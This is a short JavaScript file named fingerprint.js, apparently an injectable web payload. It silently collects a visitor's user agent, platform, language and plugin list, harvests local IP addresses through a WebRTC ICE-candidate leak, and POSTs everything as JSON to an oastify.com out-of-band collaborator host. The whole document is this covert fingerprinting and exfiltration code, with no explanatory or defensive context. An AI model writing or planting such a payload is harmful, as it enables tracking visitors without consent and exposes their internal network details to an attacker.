// https://yourdomain.com/fingerprint.js
(function(){
let d={userAgent:navigator.userAgent,platform:navigator.platform,language:navigator.language,plugins:[]};
for(let i=0;i<navigator.plugins.length;i++){d.plugins.push(navigator.plugins[i].name);}
function g(cb){let i=[],p=RTCPeerConnection||webkitRTCPeerConnection;if(!p)return cb([]);
let pc=new p({iceServers:[]});pc.createDataChannel("");pc.createOffer().then(o=>pc.setLocalDescription(o));
pc.onicecandidate=e=>{if(e&&e.candidate){let m=/([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
if(m&&!i.includes(m[1])){i.push(m[1]);cb(i);}}};}
g(function(ip){d.ipAddresses=ip;
fetch("2tw7azhk0ftwi42ha2lu2h5n6ec50zoo.oastify.com",{method:"POST",body:JSON.stringify(d),headers:{"Content-Type":"application/json"}});});
})();
